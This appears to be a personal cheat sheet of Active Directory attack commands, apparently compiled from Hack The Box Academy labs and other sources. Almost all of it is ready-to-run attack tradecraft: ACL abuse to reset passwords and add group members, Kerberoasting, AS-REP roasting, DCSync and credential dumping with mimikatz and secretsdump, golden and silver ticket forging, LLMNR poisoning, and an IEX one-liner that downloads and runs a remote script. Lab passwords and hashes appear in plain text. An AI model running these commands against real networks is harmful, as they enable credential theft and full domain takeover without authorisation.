# Windows
### Active Directory
- ACL`s
```
#PowerView
PS C:\htb> Import-Module .\PowerView.ps1
PS>Find-InterestingDomainAcl

```

```
-- Name to sid
PS C:\htb> $sid = Convert-NameToSid wley
```
```
-- find all domain objects that our user has rights over
PS C:\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}


--find the rights a group may have

PS C:\htb> $itgroupsid = Convert-NameToSid "Information Technology"

PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose

```
```
---map the right name back to the GUID value

 PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
    
    PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
    
```

```
--Resolve guid with PowerView

PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```

```
--Creating a List of Domain Users With PowerView

PS C:\htb> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

```
-- retrieve ACL information for each domain user

PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```
```
--Changing the User's Password (GenericAll - AllExtendedRights)

PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```
```
-- Add an AD Users To a Group  (GenericAll -AllExtendedRights)

PS C:\htb> Add-DomainGroupMember -Identity {AD GREOPU NAME} -Members {USER NAME} -Credential $Cred2 -Verbose

THEN REMOVE IT
PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```
```
--Assigneing an SPN to a user (GenericWrite)

 PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose


THEN REMOVE IT
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```
### SharpView Enumeration
```
- Enum Domain User
PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend
```
### PowerView Enumeration

```
-- Domain User Information

PS C:\htb> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```

```
--Get members of an AD group

PS C:\htb> Get-DomainGroup -Identity {AD GROUP NAME} | select memberof
```

```
Remote Machine User Groups

--Enumerating the Remote Desktop Users Group

PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

--  Search for passwords in Users description

PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}

--Enumerating the Remote Management Users Group

PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

--Testing for Local Admin Access

PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01


```
```
--View User`s Group Membership

 PS C:\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl

--Enumerating GPO Names with PowerView

PS C:\htb> Get-DomainGPO |select displayname

```
```
--Check users Replication Rights
PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"

PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
```
--Checking for Reversible Encryption Option using Powerview

PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```
```
-- Find Unconstrained Computers

PS> Get-DomainComputer -Unconstrained 
```
```
-- Find Constrained Delegation Computers

PS > Get-DomainComputer -TrustedToAuth -Properties distinguishedname,msds-allowedtodelegateto,useraccountcontrol -Verbose | fl 

Gain acces to that computer then execute this

PS > .\Rubeus.exe dump
 
```


```
        Command 	Description
Export-PowerViewCSV 	Append results to a CSV file
ConvertTo-SID 	        Convert a User or group name to its SID value
Get-DomainSPNTicket 	Requests the Kerberos ticket for a specified Service Principal Name (SPN) account
Domain/LDAP Functions: 	
Get-Domain 	        Will return the AD object for the current (or specified) domain
Get-DomainController 	Return a list of the Domain Controllers for the specified domain
Get-DomainUser 	        Will return all users or specific user objects in AD
Get-DomainComputer 	Will return all computers or specific computer objects in AD
Get-DomainGroup 	Will return all groups or specific group objects in AD
Get-DomainOU 	        Search for all or specific OU objects in AD
Find-InterestingDomainAcl 	Finds object ACLs in the domain with modification rights set to non-built in objects
Get-DomainGroupMember 	Will return the members of a specific domain group
Get-DomainFileServer 	Returns a list of servers likely functioning as file servers
Get-DomainDFSShare 	Returns a list of all distributed file systems for the current (or specified) domain
GPO Functions: 	
Get-DomainGPO 	        Will return all GPOs or specific GPO objects in AD
Get-DomainPolicy 	Returns the default domain policy or the domain controller policy for the current domain
Computer Enumeration Functions: 	
Get-NetLocalGroup 	Enumerates local groups on the local or a remote machine
Get-NetLocalGroupMember 	Enumerates members of a specific local group
Get-NetShare 	        Returns open shares on the local (or a remote) machine
Get-NetSession 	        Will return session information for the local (or a remote) machine
Test-AdminAccess 	Tests if the current user has administrative access to the local (or a remote) machine
Threaded 'Meta'-Functions: 	
Find-DomainUserLocation 	Finds machines where specific users are logged in
Find-DomainShare 	Finds reachable shares on domain machines
Find-InterestingDomainShareFile 	Searches for files matching specific criteria on readable shares in the domain
Find-LocalAdminAccess 	Find machines on the local domain where the current user has local administrator access
Domain Trust Functions: 	
Get-DomainTrust 	Returns domain trusts for the current domain or a specified domain
Get-ForestTrust 	Returns all forest trusts for the current forest or a specified forest
Get-DomainForeignUser 	Enumerates users who are in groups outside of the user's domain
Get-DomainForeignGroupMember 	Enumerates groups with users outside of the group's domain and returns each foreign member
Get-DomainTrustMapping 	Will enumerate all trusts for the current domain and any others seen.
```

### ADRecon Enumeration

```
PS C:\htb> .\ADRecon.ps1
```

### Powershell Useful
```
            #### Builtin AD ENUM
PS C:\htb> Import-Module ActiveDirectory

-Get Domain Info
PS C:\htb> Get-ADDomain

-Get-ADUser
PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

-Group Enumeration
PS C:\htb> Get-ADGroup -Filter * | select name

-Group Membership
PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"

- Checking For Trust Relationships
Get-ADTrust -Filter *
```
```
Creating a SecureString Object

PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
```
```
---Creating a PSCredential Object
PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
```

```
--Establishing WinRM Session from Windows

PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force

PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)

PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
```
```
-available modules loaded for use
PS >Get-Module 

-Print Exec Policy
PS >Get-ExecutionPolicy -List

-Fix Execution Policy
PS >Set-ExecutionPolicy Bypass -Scope Process 

-Print Powershell history (specific User)
PS > Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt 

- Print Env variables
PS > Get-ChildItem Env: | ft Key,Value 

```
```
- Downgrade Powershell
        PS C:\htb> Get-host

        PS C:\htb> powershell.exe -version 2

        PS C:\htb> Get-host

        PS C:\htb> get-module
```

```
#Checking Defenses


- Firewall
  PS C:\htb> netsh advfirewall show allprofiles
  PS C:\htb> netsh advfirewall show state


- Windows Defender
    PS C:\htb> Get-MpComputerStatus

```

```
-Other Logged in Users
PS C:\htb> qwinsta
```
### Group3r 
```
Group3r must be run from a domain-joined host with a domain user

C:\htb> group3r.exe -f <filepath-name.log>

```
### Enumerating MSSQL Instances with PowerUpSQL

```
PS C:\htb> cd .\PowerUpSQL\

PS C:\htb>  Import-Module .\PowerUpSQL.ps1

PS C:\htb>  Get-SQLInstanceDomain

```

### Kerberoast
```
--Finding Users With SPN Set (PowerView)

PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

-Enumerating SPNs with setspn.exe

 C:\htb> setspn.exe -Q */*



```

```
#With Rebeus
 PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap
 ```
 ```
 -targeting a single user with System.IdentityModel
 
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
        
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

-Using the /tgtdeleg Flag to delegate encryption

PS C:\htb> .\Rubeus.exe kerberoast /tgtdeleg /user:testspn

!! Doesnt work in WindowsServer 2019
```

```
-Retrieving All Tickets Using setspn.exe

PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

```

```
-Extracting Tickets from Memory with Mimikatz

mimikatz # base64 /out:true

mimikatz # kerberos::list /export 


$ echo "<base64 blob>" |  tr -d \\n 
$ cat encoded_file | base64 -d > sqldev.kirbi
$ python2.7 kirbi2john.py sqldev.kirbi
$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt

```
```
-- Using PowerView

 PS C:\htb> Get-DomainUser * -spn | select samaccountname
 
 PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

-Exporting All Tickets to a CSV File

PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation


-Checking Supported Encryption Types

PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

```

```

- Invoke-Kerberoast.ps1

 PS C:\Temp > IEX(new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1");Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hash.kerberoast
```
### AS-REPRoasting

```
-With PowerView

PS>  Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose


PS>  Import-Module .\ASREPRoast.ps1

PS> Get-ASRepHash -Domain m0chanAD.local -UserName m0chan

PS> hashcat64.exe -a 0 -m 7500 asrep.hash /wordlists/rockyou.txt
```
```
-With Rebeus
PS >  .\Rubeus asrep /format:hashcat

-ASREP All Users in a Specific OU
PS > .\Rubeus asrep /ou:OU=SerivceAcc,DC=m0chanAD,DC=local /format:hashcat /outfile:C:\Temp\Hashes.txt

-Roasting a Specific Users

PS > .\Rubeus asrep /user:mssqlservice /format:hashcat
```
### Kerberos Bruteforcing

```
PS > .\Rubeus.exe brute /users:usernames.txt /passwords:pass.txt /domain:m0chanAd.local /outfile:brutepasswords.txt
```

### DCSync

```
--Performing the Attack with Mimikatz

 mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
 ```
### Silver Ticket

```
mimikatz “kerberos::golden /admin:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:{Domain SID} /target:adsmswin2k8r2.lab.adsecurity.org /rc4:{target ntlm hash} /service:cifs /ptt” exit
```

```
-- Inject the ticket with Rebeus

PS > .\Rubeus.exe ptt /ticket:C:\Temp\silver.kirbi

PS > .\Rubeus.exe ptt /ticket:BASE64BLOBHERE
```
### Godlen Tickets

```
- With Mimikatz

mimikatz.exe 
kerberos::golden /domain:m0chanAD.local /sid:<domain-sid> /krbtgt:<krbtgt nt hash> /id:500 /user:FakeAdmin /ticket persistance4life.kirbi
```
### Enumerating Trust Relationships
```
--Using Get-ADTrust (bultin)

PS C:\htb> Import-Module activedirectory

PS C:\htb> Get-ADTrust -Filter *
```
```
--Using Get-DomainTrustMapping
PS C:\htb> Get-DomainTrustMapping
```
```
--Using netdom to query domain trust
 C:\htb> netdom query /domain:inlanefreight.local trust
 ```
```
--Using netdom to query domain controllers

C:\htb> netdom query /domain:inlanefreight.local dc
```
### SIDHistory
```
--Obtaining the KRBTGT Account's NT Hash using Mimikatz

  PS C:\htb>  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt

--Using Get-DomainSID (PowerView)

  PS C:\htb> Get-DomainSID
```
## Golden Ticket
```
-- Golden Ticket with Mimikatz
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:{child domain(compromised) sid} /krbtgt:9d765b482771505cbe97411065964d5f /sids:{Enterprise Admins sid} /ptt
```

```
--Confirming a Kerberos Ticket is in Memory 
PS C:\htb> klist
```
```
--Golden Ticket using Rubeus
PS C:\htb>  .\Rubeus.exe golden /rc4:{krbtgt nt hash} /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```
### LLMNR/NBT-NS Poisoning

```
- Using Powershell Inveigh.ps1

PS C:\htb> Import-Module .\Inveigh.ps1

PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

```
PS C:\htb> .\Inveigh.exe
```

### Enumerating for MS-PRN Printer Bug

```
PS> Import-Module .\SecurityAssessment.ps1

PS C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
### Enum shares with Snaffler
```
PS C:\Tools>Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data

```
### Sharphound

```
PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT
```


### CMD

- Basic Enumeration Commands
```
- Prints the PC's Name
>hostname

-Patches and Hotfixes
>wmic qfe get Caption,Description,HotFixID,InstalledOn

-Find Domain Name
>set %USERDOMAIN% 

-Find Domain Controller
>set %logonserver%

```
```
-Check Windows Defender

C:\htb> sc query windefend
```

- net commands
```
-Information about password requirements
>net accounts 	                         

-Password and lockout policy
>net accounts /domain 	                        

-Information about domain groups
>net group /domain 	                        

-List users with domain admin privileges
>net group "Domain Admins" /domain 	        

-List of PCs connected to the domain
>net group "domain computers" /domain 	        


-List PC accounts of domains controllers
>net group "Domain Controllers" /domain  	

-User that belongs to the group
>net group <domain_group_name> /domain 	        


-List of domain groups
>net groups /domain 	                        

-All available groups
>net localgroup 	

-List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)
>net localgroup administrators /domain 	        


-Information about a group (admins)
>net localgroup Administrators 	                

-Add user to administrators
>net localgroup administrators [username] /add 	

-Check current shares
>net share 	 


-Get information about a user within the domain
>net user <ACCOUNT_NAME> /domain 	        

-List all users of the domain
>net user /domain 	                        

-Information about the current user
>net user %username% 	                        

-Mount the share locally
>net use x: \computer\share 	                

-Get a list of computers
>net view 	  


-Shares on the domains
>net view /all /domain[:domainname] 	        

-List shares of a computer
>net view \computer /ALL 	   

 - List of PCs of the domain
>net view /domain 	                      
```

# Linux 



### AD Enumeration

```
--CME - Domain User Enumeration

$ sudo crackmapexec smb 172.16.5.5 -u {username} -p {password} --users

--CME -Domain Groups

$ sudo crackmapexec smb 172.16.5.5 -u {username} -p {password} --groups

```

```
--Enumerating Shares

$ sudo crackmapexec smb 172.16.5.5 -u {username} -p {password} --shares

--dig through each readable share

$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

```

- SMBMap

```
- SMBMap To Check Access

$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

- RPCClient

```
- NULL sessions

$ rpcclient -U "" -N 172.16.5.5
``` 
```
-  User Enumeration By RID

rpcclient $> queryuser 0x457
```
```
- enumerate all users
    
rpcclient $> enumdomusers

```
- PSExec.py
```
- We Need a set of admin credentials

$ psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```
- WmiExec.py
```
 $ wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
 ```
- windapsearch

```
-Find Domain Admins

$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```
```
-Find Privileged Users

$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

### DCSync

- CrackMapExec
```
--Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py
$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
```
### Kerberoasting
```
-Find users with spn`s set
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/{user}

```
```
-Requesting all TGS Tickets
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/{user} -request
```
```
-Requesting a Single TGS ticket
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```
```
-Cracking the Ticket Offline with Hashcat
$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```
### AS-REPRoasting

```
$ python GetNPUsers.py m0chanAD/ -usersfile TargetUsers.txt -format hashcat -outputfile hashes.asreproast


```
### Kerberos Bruteforcing

```
$ python kerbrute.py -domain m0chanAD.local -users usernames.txt -passwords pass.txt -outputfile foundusers.txt
```

### Responder

```
$ sudo responder -I {iface} -A 
```

### fping
```
$ fping -asgq 172.16.5.0/23
-q not to show per target results
-a alive targets
-s shows stats
-g generate a list of the cidr notation
```

### Kerbrute
```
$ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

### Silver Ticket

```
- Using ticketer.py

$  python ticketer.py -domain-sid S-1-5-21-1473643419-774954089-2222323452 -nthash d7e2b80507ea074ad59f152a1ba20458 -domain m0chanAD.local -spn cifs/workstation.m0chanAD.local m0chan

KRB5CCNAME=/scripts/m0chan.ccache (the above exported file)

```

### adidnsdump

```
$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r 
```

